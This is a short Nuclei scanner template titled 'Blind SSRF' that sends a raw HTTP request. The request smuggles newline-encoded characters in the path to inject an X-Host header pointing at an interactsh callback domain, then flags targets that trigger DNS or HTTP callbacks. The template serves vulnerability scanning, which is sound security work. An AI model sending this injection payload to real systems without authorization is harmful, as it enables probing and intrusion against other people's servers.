id: 0x110

info:
  name: Blind SSRF
  author: reewardius
  severity: high
  tags: ssrf

http:
  - raw:
      - |
        GET /%20HTTP/1.1%0AX-Host:%20{{Host}}.{{Port}}.BSSRF-110.{{interactsh-url}}%0A%0A HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: no-transform
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*

    unsafe: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or